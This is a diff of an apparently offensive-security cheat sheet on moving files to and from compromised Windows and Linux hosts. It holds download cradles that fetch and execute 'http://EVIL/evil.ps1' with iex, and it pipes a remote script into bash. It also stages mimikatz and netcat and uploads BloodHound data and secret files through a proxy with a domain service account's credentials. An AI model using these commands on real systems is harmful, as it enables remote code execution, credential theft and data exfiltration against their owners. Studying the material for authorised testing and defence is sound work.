@@ -27,17 +27,44 @@
 
 `echo <base64> | base64 -d -w 0 > bloodhound.zip `
 
-### base64 encode/decode
+### Copy-Item 
 
-##### encode
+`Copy-Item -Path C:\Temp\nc.exe -Destination C:\Temp\nc.exe -ToSession $session`
+
+### Set-Content 
+
+`Invoke-Command -ComputerName 10.10.10.132 -ScriptBlock {Set-Content -Path C:\Temp\nc.exe -value $using:file}`
+
+
+## copy / xcopy / robocopy
+
+
+```po
+xcopy \\10.10.10.132\share\nc.exe nc.exe
+copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe
+```
+
+## Map / Mount Drives
+
+
+```
+net use Q: \\10.10.10.132\share
+pushd \\10.10.10.132\share
+mklink /D share \\10.10.10.132\share
+smbclient //10.10.10.132/share -U username -W domain
+```
+
+### Base64 Encode/Decode
+
+##### Encode
 
 `[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\TEMP\admin.kirbi"))`
 
-##### decode
+##### Decode
 
 `[IO.File]::WriteAllBytes("admin.kirbi", [Convert]::FromBase64String("<base64>"))`
 
-### download cradles
+### Download Cradles
 
 from @harmj0y:
 
@@ -71,11 +98,6 @@ from @harmj0y:
      `$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText`
 
 
-### bitstransfer
-
-`Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r`
-
-
 > DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
 > The code to execute needs to be a base64 encoded string stored in a TXT record
 
@@ -103,18 +125,46 @@ Links:
 https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 
 
-## bitsadmin.exe
+### bitsadmin.exe
 
-`bitsadmin.exe /transfer n https://gist.githubusercontent.com/egre55/816ddb91016034dcf747f4ea5f054767/raw/69da838fdfd74811060aabfe1f66c8cd0d058daf/procmon.ps1 C:\Users\Public\Music\procmon.ps1`
 
-Links: 
+```
+bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
+```
 
-https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
+
+PowerShell also enables interaction with BITS, and enables file downloads and uploads, supports credentials and can use specified proxy servers.
+
+Download: 
+
+```powershell
+Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
+```
+
+
+Upload, specifying a proxy server:
+
+
+```powershell
+Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
+```
 
 
 ## scp / pscp.exe
 
+Upload:
+
+`scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`
+
+Download:
+
+`scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`
+
+Upload:
+
 `pscp.exe C:\Users\Public\info.txt user@target:/tmp/info.txt`
+
+Download: 
 
 `pscp.exe user@target:/home/user/secret.txt C:\Users\Public\secret.txt`
 
@@ -156,7 +206,7 @@ https://twitter.com/egre55/status/1087685529016193025
 `openssl.exe enc -base64 -d -in mimikatz.txt -out mimikatz.exe`
 
 
-## WebDAV downloaders
+## WebDAV Downloaders
 
 
 ### makecab.exe
@@ -183,17 +233,17 @@ Links:
 https://twitter.com/Oddvarmoe/status/984749424395112448
 
 for a more complete list of WebDAV downloaders check the LOLBINS/LOLBAS project created by @api0cradle:
-https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
+https://github.com/LOLBAS-Project/LOLBAS
 
 
-## netcat
+## Netcat
 
 `nc -nlvp 8000 > mimikatz.exe`
 
 `nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe`
 
 
-## openssl
+## OpenSSL
 
 `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`
 
@@ -202,17 +252,9 @@ https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 `openssl s_client -connect 10.10.10.10:80 -quiet > mimikatz.exe`
 
 
-## web browser / server
+## Web Browser
 
-`python -m SimpleHTTPServer 80`
-
-`python3 -m http.server`
-
-`ruby -run -ehttpd . -p80`
-
-`php -S 0.0.0.0:80`
-
-`socat TCP-LISTEN:80,reuseaddr,fork`
+`:)`
 
 
 ## wget
@@ -272,17 +314,29 @@ Links:
 https://staheri.com/my-blog/2013/january/vbscript-download-file-from-url/
 
 
-## curl
+## cURL
 
 `curl -o /tmp/info.txt http://10.10.10.10:80/info.txt`
 
 
-## rdesktop
+## Remote Desktop
+
+### rdesktop
 
 `rdesktop 10.10.10.10 -r disk:linux='/home/user/rdesktop/files'`
 
+#### tsclient.exe
 
-## smb
+![rdp](assets/rdp.png)
+
+After selecting the drive, we can interact with it in the remote session as follows: 
+
+```
+copy \\tsclient\c\temp\mimikatz.exe .
+```
+
+
+## SMB
 
 `smbclient //10.10.10.10/share -U username -W domain`
 
@@ -295,7 +349,7 @@ https://staheri.com/my-blog/2013/january/vbscript-download-file-from-url/
 `mklink /D share \\10.10.10.10\share`
 
 
-## ftp
+## FTP
 
 > ftp -s:script.txt
 
@@ -313,7 +367,7 @@ Links:
 https://www.jscape.com/blog/using-windows-ftp-scripts-to-automate-file-transfers
 
 
-## tftp
+## TFTP
 
 `tftp -i 10.10.10.10 get mimikatz.exe`
 
@@ -333,3 +387,108 @@ https://www.jscape.com/blog/using-windows-ftp-scripts-to-automate-file-transfers
 Links:
 
 https://xapax.gitbooks.io/security/content/transfering_files_to_windows.html
+
+
+### Bash (/dev/tcp)
+
+There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads. 
+
+```bash
+exec 3<>/dev/tcp/10.10.10.32/80
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+cat <&3
+```
+
+### PHP
+
+PHP is also very prevalent, and provides multiple file transfer methods.
+
+#### file_get_contents() 
+
+`php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
+
+#### fopen() 
+
+`php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
+
+
+`php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'`
+
+
+`php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
+
+
+### Python
+
+```python
+# Python 2
+
+import urllib
+urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
+
+# Python 3
+
+python
+import urllib.request
+urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
+```
+
+
+### Ruby
+
+
+`ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`
+
+
+### Perl
+
+
+`perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`
+
+
+### Go
+
+
+```go
+package main
+
+import (
+	 "os"
+     "io"
+     "net/http"
+)
+
+func main() {
+     lfile, err := os.Create("LinEnum.sh")
+     _ = err
+     defer lfile.Close()
+
+     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
+     response, err := http.Get(rfile)
+     defer response.Body.Close()
+
+     io.Copy(lfile, response.Body)
+}
+```
+
+
+# Web Servers
+
+In addition to Apache and Nginx, it is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed or access to the Internet, in which case a mini web server can be used. What they perhaps lack in security, they make up for in flexibility, as the webroot location and listening ports can quickly be changed.
+
+
+```bash
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
+ruby -run -ehttpd . -p80
+php -S 0.0.0.0:80
+socat TCP-LISTEN:80,reuseaddr,fork
+```
+
+
+With administrative access to a Windows machine, IIS can be installed. 
+
+`Add-WindowsFeature Web-Server, Web-Mgmt-Tools`
+
+
